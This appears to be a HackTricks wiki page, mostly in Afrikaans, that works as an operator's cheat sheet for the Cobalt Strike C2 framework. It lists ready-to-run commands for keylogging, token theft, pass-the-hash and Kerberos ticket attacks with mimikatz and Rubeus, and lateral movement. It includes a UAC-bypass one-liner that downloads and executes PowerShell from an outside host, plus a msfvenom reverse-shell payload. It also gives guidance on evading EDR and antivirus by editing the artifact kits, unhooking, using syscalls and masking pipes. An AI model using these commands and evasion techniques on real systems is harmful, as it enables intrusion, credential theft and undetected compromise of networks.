# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, waarna jy kan kies waar om te luister, watter tipe beacon om te gebruik (http, dns, smb...) en meer.

### Peer2Peer Listeners

Die beacons van hierdie listeners hoef nie direk met die C2 te kommunikeer nie; hulle kan daardeur kommunikeer via ander beacons.

`Cobalt Strike -> Listeners -> Add/Edit`, waarna jy die TCP- of SMB-beacons moet kies

* Die **TCP beacon sal 'n listener op die gekose poort instel**. Om aan 'n TCP beacon te koppel, gebruik die opdrag `connect <ip> <port>` vanaf 'n ander beacon
* Die **smb beacon sal op 'n pipename met die gekose naam luister**. Om aan 'n SMB beacon te koppel, moet jy die opdrag `link [target] [pipe]` gebruik.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** vir HTA-lêers
* **`MS Office Macro`** vir 'n Office-dokument met 'n makro
* **`Windows Executable`** vir 'n .exe, .dll of diens-.exe
* **`Windows Executable (S)`** vir 'n **stageless** .exe, .dll of diens-.exe (stageless is beter as staged, met minder IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dit sal 'n script/uitvoerbare lêer genereer om die beacon vanaf Cobalt Strike af te laai in formate soos: bitsadmin, exe, powershell en python

#### Host Payloads

As jy reeds die lêer het wat jy op 'n webbediener wil host, gaan bloot na `Attacks -> Web Drive-by -> Host File`, kies die lêer om te host en stel die webbedienerkonfigurasie op.

### Beacon Options

<details>
<summary>Beacon-opsies en -opdragte</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- 'n Custom agent hoef slegs die Cobalt Strike Team Server HTTP/S-protokol (verstek malleable C2 profile) te gebruik om te registreer/check-in en take te ontvang. Implementeer dieselfde URI's/headers/metadata-kripto wat in die profile gedefinieer is om die Cobalt Strike UI vir tasking en output te hergebruik.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- 'n Aggressor Script (bv. `CustomBeacon.cna`) kan payload-generering vir die nie-Windows beacon omvou sodat operators die listener kan kies en ELF-payloads direk vanuit die GUI kan produseer.
- Voorbeelde van Linux task handlers wat aan die Team Server blootgestel word: `sleep`, `cd`, `pwd`, `shell` (voer arbitrêre commands uit), `ls`, `upload`, `download` en `exit`. Dit map na task IDs wat deur die Team Server verwag word en moet server-side geïmplementeer word om output in die korrekte formaat terug te stuur.
- BOF-support op Linux kan bygevoeg word deur Beacon Object Files in-process te laai met [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (ondersteun Outflank-style BOFs ook), wat modulêre post-exploitation binne die implant se context/privileges laat loop sonder om nuwe prosesse te spawn.<sup>[[2]](#references)[[3]](#references)</sup>
- Embed 'n SOCKS handler in die custom beacon om pivoting-pariteit met Windows Beacons te behou: wanneer die operator `socks <port>` uitvoer, moet die implant 'n plaaslike proxy oopmaak om operator-tooling deur die gekompromitteerde Linux-host na interne networks te routeer.

## Opsec

### Execute-Assembly

Die **`execute-assembly`** gebruik 'n **sacrificial process** met remote process injection om die aangeduide program uit te voer. Dit is baie noisy, want om binne 'n process te inject word sekere Win APIs gebruik wat elke EDR nagaan. Daar is egter sommige custom tools wat gebruik kan word om iets in dieselfde process te laai:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike kan jy ook BOF (Beacon Object Files) gebruik: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Die agressor script `https://github.com/outflanknl/HelpColor` sal die `helpx` command in Cobalt Strike skep, wat kleure by commands sal voeg om aan te dui of hulle BOFs (groen), Frok&Run (geel) en soortgelyk is, of ProcessExecution, injection of soortgelyk (rooi). Dit help om te weet watter commands meer stealthy is.

### Tree op as die user

Jy kan events soos `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` nagaan:

- Security EID 4624 - Gaan al die interactive logons na om die gewone operating hours te bepaal.
- System EID 12,13 - Gaan die shutdown/startup/sleep-frekwensie na.
- Security EID 4624/4625 - Gaan inbound geldige/ongeldige NTLM-pogings na.
- Security EID 4648 - Hierdie event word geskep wanneer plaintext credentials gebruik word om aan te meld. As 'n process dit gegenereer het, bevat die binary moontlik die credentials in clear text in 'n config file of binne die code.

Wanneer `jump` vanaf cobalt strike gebruik word, is dit beter om die `wmi_msbuild`-method te gebruik om die nuwe process meer legitiem te laat lyk.

### Gebruik computer accounts

Dit is algemeen dat defenders vreemde behaviour wat deur users gegenereer word, nagaan en **service accounts en computer accounts soos `*$` van hul monitoring uitsluit**. Jy kan hierdie accounts gebruik om lateral movement of privilege escalation uit te voer.

### Gebruik stageless payloads

Stageless payloads is minder noisy as staged payloads omdat hulle nie 'n second stage van die C2 server hoef af te laai nie. Dit beteken dat hulle geen network traffic ná die aanvanklike connection genereer nie, wat hulle minder geneig maak om deur network-based defenses opgespoor te word.

### Tokens & Token Store

Wees versigtig wanneer jy tokens steel of genereer, want dit kan moontlik wees dat 'n EDR al die tokens van al die threads enumerate en 'n **token belonging to a different user** of selfs SYSTEM in die process vind.

Dit laat jou toe om tokens **per beacon** te stoor sodat dit nie nodig is om dieselfde token oor en oor te steel nie. Dit is nuttig vir lateral movement of wanneer jy 'n gesteelde token verskeie kere moet gebruik:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Wanneer jy laterally move, is dit gewoonlik beter om **'n token te steel as om 'n nuwe een te genereer** of 'n pass the hash attack uit te voer.

### Guardrails

Cobalt Strike het 'n feature genaamd **Guardrails** wat help om die gebruik van sekere commands of actions te voorkom wat deur defenders opgespoor kan word. Guardrails kan gekonfigureer word om spesifieke commands, soos `make_token`, `jump`, `remote-exec` en ander wat algemeen vir lateral movement of privilege escalation gebruik word, te blokkeer.

Verder bevat die repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ook sommige checks en idees wat jy kan oorweeg voordat jy 'n payload uitvoer.

### Tickets encryption

Wees in 'n AD versigtig met die encryption van tickets. By verstek sal sommige tools RC4-encryption vir Kerberos-tickets gebruik, wat minder veilig as AES-encryption is, en bygewerkte environments sal by verstek AES gebruik. Dit kan deur defenders opgespoor word wat vir swak encryption algorithms monitor.

### Vermy Defaults

Wanneer Cobalt Stricke gebruik word, sal die SMB pipes by verstek die name `msagent_####` en `"status_####"` hê. Verander daardie name. Dit is moontlik om die name van die bestaande pipes vanuit Cobal Strike te nagaan met die command: `ls \\.\pipe\`

Verder word 'n pipe genaamd `\\.\pipe\postex_ssh_####` met SSH-sessies geskep. Verander dit met `set ssh_pipename "<new_name>";`.

Ook in poext exploitation attack kan die pipes `\\.\pipe\postex_####` gewysig word met `set pipename "<new_name>"`.

In Cobalt Strike profiles kan jy ook dinge soos die volgende wysig:

- Vermy die gebruik van `rwx`
- Hoe die process injection behavior werk (watter APIs gebruik sal word) in die `process-inject {...}` block
- Hoe die "fork and run" werk in die `post-ex {…}` block
- Die sleep time
- Die maksimum grootte van binaries wat in memory gelaai word
- Die memory footprint en DLL-content met die `stage {...}` block
- Die network traffic

### Bypass memory scanning

Sommige ERDs scan memory vir sekere bekende malware signatures. Coblat Strike laat jou toe om die `sleep_mask` function as 'n BOF te wysig wat die bacldoor in memory sal kan encrypt.

### Noisy proc injections

Wanneer code in 'n process geïnject word, is dit gewoonlik baie noisy. Dit is omdat **geen gewone process hierdie action gewoonlik uitvoer nie en omdat die maniere om dit te doen baie beperk is**. Dit kan daarom deur behaviour-based detection systems opgespoor word. Dit kan ook deur EDRs opgespoor word wat die network scan vir **threads wat code bevat wat nie op disk is nie** (hoewel prosesse soos browsers wat JIT gebruik dit algemeen doen). Voorbeeld: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Wanneer 'n nuwe process gespawn word, is dit belangrik om 'n **gereelde parent-child**-relationship tussen prosesse te handhaaf om detection te vermy. As svchost.exec iexplorer.exe uitvoer, sal dit suspicious lyk, aangesien svchost.exe nie in 'n normale Windows-environment 'n parent van iexplorer.exe is nie.

Wanneer 'n nuwe beacon in Cobalt Strike gespawn word, word 'n process wat **`rundll32.exe`** gebruik by verstek geskep om die nuwe listener te laat loop. Dit is nie baie stealthy nie en kan maklik deur EDRs opgespoor word. Verder word `rundll32.exe` sonder enige args uitgevoer, wat dit selfs meer suspicious maak.

Met die volgende Cobalt Strike command kan jy 'n ander process spesifiseer om die nuwe beacon te spawn, wat dit minder detecteerbaar maak:
```bash
spawnto x86 svchost.exe
```
Jy kan ook hierdie instelling **`spawnto_x86` en `spawnto_x64`** in ’n profiel verander.

### Proxying aanvallers se verkeer

Aanvallers sal soms tools plaaslik moet kan uitvoer, selfs op Linux-masjiene, en die slagoffers se verkeer die tool moet laat bereik (bv. NTLM relay).

Verder is dit soms meer onopvallend om vir ’n pass-the.hash- of pass-the-ticket-aanval **hierdie hash of ticket plaaslik in die aanvaller se eie LSASS-proses te voeg** en dan van daar af te pivot, eerder as om ’n LSASS-proses op ’n slagoffer se masjien te wysig.

Jy moet egter **versigtig wees met die gegenereerde verkeer**, aangesien jy moontlik ongewone verkeer (Kerberos?) vanaf jou backdoor-proses kan stuur. Hiervoor kan jy na ’n browser-proses pivot (hoewel jy gevang kan word terwyl jy jouself in ’n proses inject, so dink aan ’n stealth-manier om dit te doen).


### AV's vermy

#### AV/AMSI/ETW Bypass

Besoek die bladsy:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Gewoonlik kan jy in `/opt/cobaltstrike/artifact-kit` die code en vooraf compiled templates (in `/src-common`) van die payloads vind wat Cobalt Strike gaan gebruik om die binary beacons te genereer.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) met die gegenereerde backdoor (of net met die compiled template) te gebruik, kan jy vind wat Defender laat trigger. Dit is gewoonlik ’n string. Jy kan dus eenvoudig die code wat die backdoor genereer, wysig sodat daardie string nie in die finale binary voorkom nie.

Nadat jy die code gewysig het, voer net `./build.sh` vanuit dieselfde directory uit en kopieer die `dist-pipe/`-folder na die Windows-client in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Moenie vergeet om die aggressiewe script `dist-pipe\artifact.cna` te laai om aan te dui dat Cobalt Strike die resources vanaf disk moet gebruik wat ons wil hê, en nie dié wat gelaai is nie.

#### Resource Kit

Die ResourceKit-folder bevat die templates vir Cobalt Strike se script-gebaseerde payloads, insluitend PowerShell, VBA en HTA.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die templates te gebruik, kan jy vasstel waarvan Defender (AMSI in hierdie geval) nie hou nie en dit wysig:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Deur die bespeurde lyne te wysig, kan mens 'n template genereer wat nie opgespoor sal word nie.

Moenie vergeet om die aggressiewe script `ResourceKit\resources.cna` te laai nie, om aan te dui dat Cobalt Strike die resources vanaf die skyf moet gebruik wat ons wil hê, en nie dié wat gelaai is nie.

#### Function hooks | Syscall

Function hooking is 'n baie algemene metode wat deur EDRs gebruik word om kwaadwillige aktiwiteit op te spoor. Cobalt Strike laat jou toe om hierdie hooks te omseil deur **syscalls** in plaas van die standaard Windows API calls te gebruik met die **`None`**-config, of om die `Nt*`-weergawe van 'n funksie met die **`Direct`**-instelling te gebruik, of bloot oor die `Nt*`-funksie te spring met die **`Indirect`**-opsie in die malleable profile. Afhangend van die stelsel kan een opsie meer stealthy as 'n ander wees.

Dit kan in die profile gestel word of deur die command **`syscall-method`** te gebruik.

Dit kan egter ook noisy wees.

Een opsie wat Cobalt Strike bied om function hooks te omseil, is om daardie hooks te verwyder met: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Jy kan ook met functions nagaan watter een hooked is deur [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) of [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) te gebruik.




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Verwysings

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42-analise van Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC-dagboek oor Cobalt Strike-verkeer](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
